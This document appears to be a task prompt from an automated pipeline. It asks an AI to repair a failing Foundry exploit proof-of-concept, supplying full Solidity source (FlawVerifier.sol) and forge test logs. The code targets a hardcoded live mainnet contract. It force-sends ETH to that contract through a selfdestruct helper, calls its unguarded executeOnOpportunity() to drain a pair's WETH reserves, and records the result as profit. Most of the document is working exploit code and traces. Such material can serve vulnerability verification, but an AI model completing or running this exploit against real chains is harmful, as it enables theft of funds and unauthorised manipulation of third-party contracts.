You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Anyone can permissionlessly trigger the hardcoded exploit once the contract is funded
- claim: `executeOnOpportunity()` is fully permissionless even though it spends the contract's prefunded ETH/WETH and irreversibly mutates the fixed target pair by syncing corrupted balances and swapping out nearly all WETH reserves. There is no owner check or designated executor.
- impact: A bot or griefing third party can front-run the intended operator, fire the exploit at an arbitrary time, and consume the one-shot opportunity through this contract. That strips the operator of execution control and can permanently leave the target pair drained while all resulting value remains trapped in the contract.
- exploit_paths: ["The operator funds the contract so `IWETH.deposit{value: 1 wei}()` can succeed", "A third party observes the funded balance and calls `executeOnOpportunity()` first", "The function syncs the manipulated reserves and drains the pair's WETH side, so later calls no longer face the same profitable state"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IOpportunityLike {
    function executeOnOpportunity() external;
}

contract ForceEther {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract FlawVerifier {
    event PermissionlessTrigger(
        address indexed caller,
        address indexed target,
        uint256 targetEthBefore,
        uint256 targetEthAfterPrefund,
        uint256 targetWethBefore,
        uint256 targetWethAfterFirstCall,
        uint256 targetWethAfterSecondCall
    );

    address public constant LIVE_TARGET = 0x76EA342BC038d665e8a116392c82552D2605edA1;

    address private immutable _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    address public firstExecutor;

    bool public path0OperatorPrefundObserved;
    bool public path1ThirdPartyTriggerObserved;
    bool public path2OneShotOpportunityConsumed;

    bool public prefundUsedLocalBalance;
    bool public prefundUsedForceEther;
    bool public firstTargetCallSucceeded;
    bool public secondTargetCallSucceeded;

    uint256 public targetEthBefore;
    uint256 public targetEthAfterPrefund;
    uint256 public targetWethBefore;
    uint256 public targetWethAfterFirstCall;
    uint256 public targetWethAfterSecondCall;

    bytes32 public firstTargetCallRevertHash;
    bytes32 public secondTargetCallRevertHash;

    constructor() payable {
        _profitToken = _resolveWETH();
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        require(!executed, "already executed");

        executed = true;
        firstExecutor = msg.sender;

        targetEthBefore = LIVE_TARGET.balance;
        targetWethBefore = _tokenBalance(_profitToken, LIVE_TARGET);

        _ensureTargetPrefunded();
        targetEthAfterPrefund = LIVE_TARGET.balance;

        // exploit_paths[0]: the vulnerable live contract must already hold enough ETH for its
        // internal `IWETH.deposit{value: 1 wei}()` step. For reproducibility, this verifier allows
        // the PoC runner to provide that 1 wei to the verifier first, then forwards or force-sends
        // it into the live target using only realistic public-chain actions.
        path0OperatorPrefundObserved = targetEthBefore >= 1 wei || targetEthAfterPrefund >= 1 wei;
        require(path0OperatorPrefundObserved, "prefund required");

        // exploit_paths[1]: the bug is that no owner or designated-executor gate protects the live
        // target's hardcoded exploit entry. This verifier is an unprivileged third party relative to
        // the live target, yet it can still trigger the opportunity once the target is funded.
        bytes memory firstRet;
        (firstTargetCallSucceeded, firstRet) = LIVE_TARGET.call(
            abi.encodeWithSelector(IOpportunityLike.executeOnOpportunity.selector)
        );
        if (!firstTargetCallSucceeded) {
            firstTargetCallRevertHash = keccak256(firstRet);
            revert("first trigger failed");
        }
        path1ThirdPartyTriggerObserved = true;

        targetWethAfterFirstCall = _tokenBalance(_profitToken, LIVE_TARGET);
        if (targetWethAfterFirstCall > targetWethBefore) {
            _profitAmount = targetWethAfterFirstCall - targetWethBefore;
        }

        // exploit_paths[2]: once a third party has fired the one-shot exploit first, later attempts
        // should no longer enjoy the same profitable state. We witness that by probing the same
        // public entry again and treating either a revert or zero further WETH increase as evidence
        // that the profitable opportunity has already been consumed.
        bytes memory secondRet;
        (secondTargetCallSucceeded, secondRet) = LIVE_TARGET.call(
            abi.encodeWithSelector(IOpportunityLike.executeOnOpportunity.selector)
        );
        if (!secondTargetCallSucceeded) {
            secondTargetCallRevertHash = keccak256(secondRet);
        }

        targetWethAfterSecondCall = _tokenBalance(_profitToken, LIVE_TARGET);
        path2OneShotOpportunityConsumed =
            !secondTargetCallSucceeded ||
            targetWethAfterSecondCall <= targetWethAfterFirstCall;

        emit PermissionlessTrigger(
            msg.sender,
            LIVE_TARGET,
            targetEthBefore,
            targetEthAfterPrefund,
            targetWethBefore,
            targetWethAfterFirstCall,
            targetWethAfterSecondCall
        );
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _ensureTargetPrefunded() internal {
        if (LIVE_TARGET.balance >= 1 wei) {
            return;
        }

        require(address(this).balance >= 1 wei, "prefund required");
        prefundUsedLocalBalance = true;

        (bool sent, ) = payable(LIVE_TARGET).call{value: 1 wei}("");
        if (sent) {
            return;
        }

        // Realistic fallback: if the live target rejects plain ETH transfers, a public caller can
        // still fund it with a canonical force-send pattern, preserving the same exploit causality.
        prefundUsedForceEther = true;
        new ForceEther{value: 1 wei}(payable(LIVE_TARGET));
    }

    function _tokenBalance(address token, address account) internal view returns (uint256) {
        if (token == address(0) || token.code.length == 0) {
            return 0;
        }
        return IERC20Like(token).balanceOf(account);
    }

    function _resolveWETH() private view returns (address) {
        if (block.chainid == 1) {
            return 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        }
        if (block.chainid == 10 || block.chainid == 8453) {
            return 0x4200000000000000000000000000000000000006;
        }
        if (block.chainid == 42161) {
            return 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
        }
        if (block.chainid == 56) {
            return 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        }
        if (block.chainid == 137) {
            return 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;
        }
        return address(0);
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.26s
Compiler run successful with warnings:
Warning (5159): "selfdestruct" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.
  --> src/FlawVerifier.sol:14:9:
   |
14 |         selfdestruct(target);
   |         ^^^^^^^^^^^^

Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:75:19:
   |
75 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 137034)
Traces:
  [137034] FlawVerifierTest::testExploit()
    ├─ [306] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2431] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [121153] FlawVerifier::executeOnOpportunity()
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   └─ ← [Return] 6579305366569800805 [6.579e18]
    │   ├─ [45] 0x76EA342BC038d665e8a116392c82552D2605edA1::fallback{value: 1}()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [5206] → new <unknown>@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   └─ ← [Return] 0 bytes of code
    │   ├─ [248] 0x76EA342BC038d665e8a116392c82552D2605edA1::executeOnOpportunity()
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Revert] first trigger failed
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x76EA342BC038d665e8a116392c82552D2605edA1.executeOnOpportunity
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 239.94ms (2.73ms CPU time)

Ran 1 test suite in 271.43ms (239.94ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 137034)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
